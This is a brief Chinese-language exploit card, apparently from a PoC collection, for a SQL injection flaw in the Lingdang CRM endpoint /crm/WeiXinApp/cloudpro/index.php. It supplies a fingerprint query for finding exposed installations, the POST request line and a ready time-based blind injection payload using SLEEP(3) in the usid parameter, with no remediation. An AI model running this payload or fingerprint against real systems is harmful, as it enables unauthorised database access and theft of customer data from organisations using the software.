# 灵当CRMcloudproindex.php存在SQL注入漏洞

灵当 ｜ SQL注入 ｜ —
- **指纹**：`body="crmcommon/js/jquery/jquery-1.10.1.min.js"`
- **请求**：`POST /crm/WeiXinApp/cloudpro/index.php HTTP/1.1`

**Payload**
```
action=getMyAccount&usid=1 AND (SELECT 1 FROM (SELECT SLEEP(3))a) -- q&my_cloudid=0
```
- **响应特征**：200